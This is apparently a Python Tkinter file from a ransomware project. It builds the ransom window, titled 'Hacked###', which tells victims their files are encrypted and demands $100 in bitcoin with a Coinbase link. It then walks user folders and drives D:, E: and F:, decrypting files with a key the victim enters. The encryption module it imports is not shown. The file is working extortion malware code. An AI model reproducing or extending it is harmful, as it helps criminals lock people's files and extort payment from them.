from cgitb import text
from tkinter import *
from PIL import ImageTk, Image
from setuptools import Command
from decryption import *
from encryption import *



def path(key):

 folder_list=['C:\\Users\\91960\\Desktop\\texts','C:\\Users\\91960\\test2','D:\\','E:\\','F:\\']
 for dir in folder_list:
    localdir =dir
    print(dir)
    for subdir, dirs, files in os.walk(localdir):
        for file in files:
            print(file)

            initiate=Recover(os.path.join(subdir, file),key)
            initiate.decrypted_file()
            initiate.winclose()

win = Tk()
win.geometry("700x500")
win.title("Hacked###")
win.minsize(700,500)
win.maxsize(700,500)

key_var=StringVar()
def padkey():
 key= key_var.get()
 key = key.encode("UTF-8")
 key = pad(key,AES.block_size)
 path(key)


frame = Frame(win, width=600, height=400)
frame.pack()
frame.place(anchor='center', relx=0.5, rely=0.5)

img = ImageTk.PhotoImage(Image.open("hacked.jpg"))

label = Label(frame, image = img)
label.pack()
pass_column= Label(text=" WARNING !!!!",font=("Ariel",25) )
instruct=Label(text="  You have been hit by a ransomeware which had encrypted your files.If you want to retrieve your files you have to give $100 worth of ")
instruct1=Label(text="bitcoin.If you dont have money in bitcoin buy it from here 'https://www.coinbase.com/signup'")
pass_column.pack()
instruct.pack()
instruct1.pack()
key_space=Label(text="Enter the key :" ,foreground="black",background="red",font=("Ariel",15)).place(x=140,y=370)
Pass_entry=Entry(win,font=("Ariel",15),textvariable=key_var,width=50,bd=5,fg="green")
Pass_entry.place(x=10,y=400)
Bt=Button(win,text="Enter",font=("Ariel",15),command=padkey).place(x=600,y=400)
win.bind('<Return>',lambda event:padkey())


win.mainloop()